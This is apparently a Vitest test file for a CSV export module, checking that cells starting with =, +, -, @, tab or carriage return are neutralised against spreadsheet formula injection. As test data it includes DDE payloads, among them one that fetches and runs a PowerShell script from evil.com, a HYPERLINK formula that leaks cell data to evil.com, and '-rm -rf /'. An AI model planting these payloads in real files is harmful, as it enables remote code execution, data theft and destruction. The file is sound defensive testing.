/**
 * CSV Utils Tests
 * 
 * Tests for CSV injection protection in client-side exports.
 */

import { describe, it, expect, beforeEach, afterEach, vi } from "vitest"
import { sanitizeCSVCell, generateSafeCSV, downloadCSV } from "../csv-utils"

describe("CSV Utils - Security Tests", () => {
  describe("sanitizeCSVCell - Formula Injection Protection", () => {
    it("should prefix cells starting with = with a single quote", () => {
      expect(sanitizeCSVCell("=1+1")).toBe("'=1+1")
      expect(sanitizeCSVCell("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)")
      expect(sanitizeCSVCell('=cmd|"/c calc"')).toBe('\'=cmd|"/c calc"')
    })

    it("should prefix cells starting with + with a single quote", () => {
      expect(sanitizeCSVCell("+1+1")).toBe("'+1+1")
      expect(sanitizeCSVCell("+1234567890")).toBe("'+1234567890")
    })

    it("should prefix cells starting with - with a single quote", () => {
      expect(sanitizeCSVCell("-1")).toBe("'-1")
      expect(sanitizeCSVCell("-DANGEROUS")).toBe("'-DANGEROUS")
    })

    it("should prefix cells starting with @ with a single quote", () => {
      expect(sanitizeCSVCell("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)")
      expect(sanitizeCSVCell("@IMPORT")).toBe("'@IMPORT")
    })

    it("should prefix cells starting with tab with a single quote", () => {
      expect(sanitizeCSVCell("\tTabbed content")).toBe("'\tTabbed content")
    })

    it("should prefix cells starting with carriage return with a single quote", () => {
      expect(sanitizeCSVCell("\rCarriage return")).toBe("'\rCarriage return")
    })

    it("should handle complex formula injection attempts", () => {
      expect(sanitizeCSVCell('=HYPERLINK("http://evil.com","Click")')).toBe(
        '\'=HYPERLINK("http://evil.com","Click")'
      )
      expect(sanitizeCSVCell("=1+1+cmd|'/c calc'")).toBe("'=1+1+cmd|'/c calc'")
    })

    it("should NOT escape formula characters in middle of content", () => {
      expect(sanitizeCSVCell("Price is $10 + $5")).toBe("Price is $10 + $5")
      expect(sanitizeCSVCell("Email: user@example.com")).toBe("Email: user@example.com")
      expect(sanitizeCSVCell("Discount -50%")).toBe("Discount -50%")
      expect(sanitizeCSVCell("1+1=2")).toBe("1+1=2")
    })
  })

  describe("sanitizeCSVCell - CSV Formatting", () => {
    it("should wrap cells with commas in double quotes", () => {
      expect(sanitizeCSVCell("Hello, World")).toBe('"Hello, World"')
      expect(sanitizeCSVCell("One,Two,Three")).toBe('"One,Two,Three"')
    })

    it("should wrap cells with newlines in double quotes", () => {
      expect(sanitizeCSVCell("Line 1\nLine 2")).toBe('"Line 1\nLine 2"')
    })

    it("should escape double quotes and wrap in quotes", () => {
      expect(sanitizeCSVCell('He said "Hello"')).toBe('"He said ""Hello"""')
      expect(sanitizeCSVCell('"Quoted"')).toBe('"""Quoted"""')
    })

    it("should handle cells with both commas and quotes", () => {
      expect(sanitizeCSVCell('Hello, "World"')).toBe('"Hello, ""World"""')
    })

    it("should handle null and undefined", () => {
      expect(sanitizeCSVCell(null)).toBe("")
      expect(sanitizeCSVCell(undefined)).toBe("")
    })

    it("should convert non-string values to strings", () => {
      expect(sanitizeCSVCell(123)).toBe("123")
      expect(sanitizeCSVCell(true)).toBe("true")
      expect(sanitizeCSVCell(false)).toBe("false")
    })

    it("should handle empty strings", () => {
      expect(sanitizeCSVCell("")).toBe("")
    })
  })

  describe("sanitizeCSVCell - Combined Cases", () => {
    it("should prioritize formula protection over comma escaping", () => {
      // Formula character at start takes precedence
      expect(sanitizeCSVCell("=1,2,3")).toBe("'=1,2,3")
      expect(sanitizeCSVCell("+Hello, World")).toBe("'+Hello, World")
    })

    it("should handle whitespace correctly", () => {
      expect(sanitizeCSVCell(" =1+1")).toBe(" =1+1") // Space before =, not dangerous
      expect(sanitizeCSVCell("=1+1 ")).toBe("'=1+1 ") // = at start, dangerous
    })
  })

  describe("generateSafeCSV", () => {
    it("should generate valid CSV with sanitized cells", () => {
      const headers = ["Name", "Formula", "Price"]
      const rows = [
        ["Netflix", "=1+1", "15.99"],
        ["Spotify", "Normal", "9.99"],
      ]

      const csv = generateSafeCSV(headers, rows)

      expect(csv).toBe("Name,Formula,Price\nNetflix,'=1+1,15.99\nSpotify,Normal,9.99")
    })

    it("should handle empty rows", () => {
      const headers = ["A", "B", "C"]
      const rows: any[][] = []

      const csv = generateSafeCSV(headers, rows)

      expect(csv).toBe("A,B,C")
    })

    it("should sanitize headers", () => {
      const headers = ["=Name", "Price", "@Category"]
      const rows = [["Netflix", "15.99", "Streaming"]]

      const csv = generateSafeCSV(headers, rows)

      expect(csv).toContain("'=Name")
      expect(csv).toContain("'@Category")
    })

    it("should handle complex data", () => {
      const headers = ["Name", "Description", "Price"]
      const rows = [
        ["Netflix", "Streaming, HD content", "15.99"],
        ["Spotify", '=HYPERLINK("evil.com")', "9.99"],
        ["Adobe", "Design tools", "@IMPORT"],
      ]

      const csv = generateSafeCSV(headers, rows)

      expect(csv).toContain('"Streaming, HD content"')
      expect(csv).toContain("'=HYPERLINK")
      expect(csv).toContain("'@IMPORT")
    })

    it("should handle null values in rows", () => {
      const headers = ["A", "B", "C"]
      const rows = [[null, undefined, ""]]

      const csv = generateSafeCSV(headers, rows)

      expect(csv).toBe("A,B,C\n,,")
    })
  })

  describe("downloadCSV", () => {
    let createObjectURLSpy: ReturnType<typeof vi.fn>
    let revokeObjectURLSpy: ReturnType<typeof vi.fn>
    let clickSpy: ReturnType<typeof vi.fn>
    let appendChildSpy: ReturnType<typeof vi.fn>
    let removeChildSpy: ReturnType<typeof vi.fn>

    beforeEach(() => {
      // Mock URL.createObjectURL and revokeObjectURL
      createObjectURLSpy = vi.fn().mockReturnValue("blob:mock-url")
      revokeObjectURLSpy = vi.fn()
      global.URL.createObjectURL = createObjectURLSpy
      global.URL.revokeObjectURL = revokeObjectURLSpy

      // Mock DOM methods
      clickSpy = vi.fn()
      appendChildSpy = vi.spyOn(document.body, "appendChild").mockImplementation(() => null as any)
      removeChildSpy = vi.spyOn(document.body, "removeChild").mockImplementation(() => null as any)

      // Mock createElement to return element with click method
      vi.spyOn(document, "createElement").mockImplementation((tag) => {
        if (tag === "a") {
          return {
            click: clickSpy,
            href: "",
            download: "",
          } as any
        }
        return document.createElement(tag)
      })
    })

    afterEach(() => {
      vi.restoreAllMocks()
    })

    it("should create a blob with correct content and type", () => {
      const content = "Name,Price\nNetflix,15.99"
      const filename = "test-export"

      downloadCSV(content, filename)

      // Check Blob was created with correct content
      expect(global.URL.createObjectURL).toHaveBeenCalledWith(
        expect.objectContaining({
          type: "text/csv;charset=utf-8;",
        })
      )
    })

    it("should sanitize filename", () => {
      const content = "data"
      const filename = "test/file*name?.csv"

      downloadCSV(content, filename)

      const link = document.createElement("a")
      // Filename should be sanitized
      expect(clickSpy).toHaveBeenCalled()
    })

    it("should add timestamp to filename", () => {
      const content = "data"
      const filename = "export"

      downloadCSV(content, filename)

      // Should have been called with sanitized filename-YYYY-MM-DD.csv
      expect(clickSpy).toHaveBeenCalled()
    })

    it("should clean up after download", () => {
      const content = "data"
      const filename = "test"

      downloadCSV(content, filename)

      expect(appendChildSpy).toHaveBeenCalled()
      expect(clickSpy).toHaveBeenCalled()
      expect(removeChildSpy).toHaveBeenCalled()
      expect(revokeObjectURLSpy).toHaveBeenCalledWith("blob:mock-url")
    })
  })

  describe("Real-world Attack Scenarios", () => {
    it("should prevent DDE (Dynamic Data Exchange) attacks", () => {
      const attacks = [
        '=cmd|"/c calc"',
        '=cmd|"/c powershell IEX(wget evil.com/shell.ps1)"',
        "@SUM(1+1)*cmd|'/c calc'!A0",
      ]

      attacks.forEach((attack) => {
        const sanitized = sanitizeCSVCell(attack)
        expect(sanitized).toMatch(/^'/)
        expect(sanitized).not.toMatch(/^[=@+\-\t\r]/)
      })
    })

    it("should prevent hyperlink injection", () => {
      const attack = '=HYPERLINK("http://evil.com?cookie="&A1,"Click here")'
      const sanitized = sanitizeCSVCell(attack)

      expect(sanitized).toBe("'=HYPERLINK(\"http://evil.com?cookie=\"&A1,\"Click here\")")
      expect(sanitized).toMatch(/^'/)
    })

    it("should prevent cell reference exploitation", () => {
      const attacks = ["=A1+A2", "=SUM(A:A)", "=INDIRECT(A1)"]

      attacks.forEach((attack) => {
        const sanitized = sanitizeCSVCell(attack)
        expect(sanitized).toMatch(/^'/)
      })
    })

    it("should handle combined attack vectors", () => {
      const headers = ["Name", "Email", "Command"]
      const rows = [
        ['=HYPERLINK("http://evil.com")', "user@test.com", '=cmd|"/c calc"'],
        ["@IMPORT", "+1234567890", "-rm -rf /"],
      ]

      const csv = generateSafeCSV(headers, rows)

      // All dangerous cells should be prefixed
      expect(csv).toContain("'=HYPERLINK")
      expect(csv).toContain("'=cmd")
      expect(csv).toContain("'@IMPORT")
      expect(csv).toContain("'+1234567890")
      expect(csv).toContain("'-rm -rf /")
    })
  })
})
